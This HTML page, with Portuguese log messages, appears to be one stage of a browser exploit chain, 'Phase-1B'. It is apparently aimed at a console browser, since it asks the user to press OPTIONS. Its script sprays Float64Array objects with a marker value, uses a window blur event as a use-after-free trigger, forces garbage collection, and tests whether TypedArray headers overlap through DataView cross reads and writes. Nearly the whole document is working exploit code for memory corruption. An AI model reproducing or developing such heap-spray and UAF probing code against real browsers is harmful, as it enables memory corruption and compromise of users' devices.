
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Phase-1B — ArrayBufferView Header UAF Test</title>
</head>
<body>
<pre id="log"></pre>
<button onclick="run()">EXECUTAR TESTE HEADER UAF</button>

<script>
const log = s => document.getElementById("log").textContent += s + "\n";

function forceGC() {
    let tmp = [];
    for (let i = 0; i < 30000; i++) {
        tmp.push(new Uint8Array(0x100));
    }
    tmp = null;
}

function run() {
    log("=== FASE 1B: TESTE DE UAF DO HEADER (ArrayBufferView) ===");
    log("Prepare-se: aperte OPTIONS quando solicitado.");

    const PATTERN = 2.121995791e-314;
    const controllers = [];

    for (let i = 0; i < 6000; i++) {
        let ta = new Float64Array(8);
        ta[0] = i;
        controllers.push(ta);
    }

    if (document.documentElement.webkitRequestFullscreen)
        document.documentElement.webkitRequestFullscreen();

    window.onblur = function () {
        log("[*] Janela de UAF aberta.");

        let spray = [];
        for (let i = 0; i < 12000; i++) {
            let t = new Float64Array(8);
            t.fill(PATTERN);
            spray.push(t);
        }

        let corrupted = null;
        for (let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }

        if (!corrupted) {
            log("[-] UAF não confirmado.");
            return;
        }

        log("[+] UAF CONFIRMADO (TypedArray).");

        const buf = corrupted.buffer;
        const dv = new DataView(buf);

        dv.setUint32(0, 0xAAAAAAAA, true);
        log("[*] Escrita inicial via DataView: 0xAAAAAAAA");

        // Destrói referências fortes
        corrupted = null;
        controllers.length = 0;
        spray = null;

        forceGC();
        log("[*] GC forçado.");

        // Criar novos TypedArrays após GC
        let victims = [];
        for (let i = 0; i < 5000; i++) {
            victims.push(new Uint32Array(8));
        }

        log("[*] Novos TypedArrays criados.");

        // Teste 1 — leitura cruzada inesperada
        for (let i = 0; i < victims.length; i++) {
            try {
                if (victims[i][0] === 0xAAAAAAAA) {
                    log("!!! SUCESSO: HEADER REUTILIZADO (leitura cruzada detectada)");
                    log("    Victim index: " + i);
                    return;
                }
            } catch {}
        }

        // Teste 2 — escrita no novo TypedArray refletida no DataView antigo
        victims[0][0] = 0xDEADBEEF;
        const r = dv.getUint32(0, true);

        log("[*] Escrita victims[0][0]=0xDEADBEEF");
        log("[*] Readback DataView antigo: 0x" + r.toString(16));

        if (r === 0xDEADBEEF) {
            log("!!! SUCESSO: OVERLAP DE HEADER CONFIRMADO (escrita cruzada)");
            return;
        }

        // Teste 3 — inconsistência estrutural
        for (let i = 0; i < victims.length; i++) {
            if (victims[i].length !== 8) {
                log("!!! SUCESSO: LENGTH CORROMPIDO (victim " + i + ")");
                log("    length=" + victims[i].length);
                return;
            }
        }

        log("[-] Nenhuma evidência de UAF de header detectada.");
        log("[-] Conclusão: headers não foram reciclados.");
    };
};
</script>
</body>
</html>
